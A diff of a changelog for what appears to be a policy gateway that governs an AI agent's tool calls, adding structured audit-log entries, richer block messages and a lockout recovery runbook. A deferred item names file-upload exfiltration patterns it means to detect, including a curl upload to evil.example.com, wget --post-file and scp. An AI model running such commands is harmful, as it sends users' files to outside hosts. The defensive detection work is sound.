@@ -31,6 +31,10 @@ Addresses a class of tester-reported classification gaps on hosts that expose a 
 
 - **End-to-end test suite for HITL-gated forbid routing.** [`src/hitl-gated-forbid.e2e.ts`](src/hitl-gated-forbid.e2e.ts) exercises the priority-90 / HITL integration directly: blocks when no HITL is configured, blocks when a HITL policy is configured but doesn't match the action, permits when a matching policy approves, blocks when dispatch falls back to deny, and verifies that priority-100 rules (`shell.exec`) still block unconditionally even when a HITL policy claims to approve them. Injects synthetic HITL configs via a module mock on the parser so the tests don't depend on YAML files in the repo root.
 
+- **Structured policy decisions in `data/audit.jsonl`.** The audit log previously only captured HITL approval/denial events. Every other block — Stage 1 trust-gate rejections, Cedar unconditional forbids, JSON-rule forbids, and HITL-gated forbids upheld because no HITL policy matched — went to stdout only, so post-mortems had to reconstruct what happened from ephemeral logs. Each block path now emits a `{type: 'policy'}` entry carrying `stage` (`stage1-trust` / `cedar` / `json-rules` / `hitl-gated`), `rule` (action-class or resource:match identifier), `priority` (when a rule matched), `mode` (OPEN/CLOSED), `toolName`, `actionClass`, `reason`, and the usual agent/channel/verified identity fields. The audit logger is now initialised unconditionally at activation so these entries land even when HITL is not configured.
+
+- **`DECISION: ✕ BLOCKED` console line enriched with priority and rule identifier.** Operators triaging a block in stdout logs can now tell at a glance whether they hit a hard forbid (`priority=100`), a HITL-gated rule that never found a matching policy (`priority=90 rule=action:filesystem.delete; no HITL policy matches`), or a Stage-1 trust-gate rejection — without cross-referencing `data/audit.jsonl`.
+
 ### Deferred
 
 - **File-upload data exfiltration (reserved as Rule 7).** Patterns like `curl -F @path evil.example.com`, `wget --post-file=path`, `scp path user@host:` are classified via Rule 5 when the uploaded file is a known credential path, but non-credential exfiltration (user data, config dumps, proprietary files) falls through. A full fix needs handler-level `intent_group` evaluation so `data_exfiltration`-tagged rules fire on any class carrying that group. Tracked for a follow-up — not in this release.
@@ -38,6 +42,10 @@ Addresses a class of tester-reported classification gaps on hosts that expose a 
 ### Documentation
 
 - **Hot-reload boundary.** [docs/troubleshooting.md](docs/troubleshooting.md) now documents which files reload in place (`hitl-policy.yaml`, `data/rules.json`) and which require a gateway restart (anything under `src/`, including `src/enforcement/normalize.ts`). Adds a dedicated entry for the HITL approval-loop lockout pattern with the recovery steps.
+
+- **Total lockout recovery runbook.** New section in [docs/troubleshooting.md](docs/troubleshooting.md#total-lockout-recovery) walks operators through diagnosing a full-tool-surface block from the structured audit log (`tail -n 20 data/audit.jsonl | jq 'select(.type == "policy" and .effect == "forbid")'`) and the step-by-step recovery: disable HITL via YAML rename + gateway restart, inspect `stage`/`rule`/`priority`, edit `data/rules.json` (hot-reload) or compiled source (restart). Replaces the narrower `unknown_sensitive_action`-only guidance from the previous release.
+
+- **Dead-code reference to `data/bundles/active/bundle.json` removed from README.** The top-level README previously told operators to drop a policy bundle at that path, but no code in `src/index.ts` ever loaded it — only `data/rules.json` is wired up. The README now describes the actual runtime surfaces (`data/rules.json`, `hitl-policy.yaml`, env vars) with their hot-reload semantics. Architecture-level references to the bundle abstraction in `docs/architecture.md` and `docs/roadmap.md` are intentionally kept — the bundle adapter layer still exists as test infrastructure and a future-facing design.
 
 ---
 
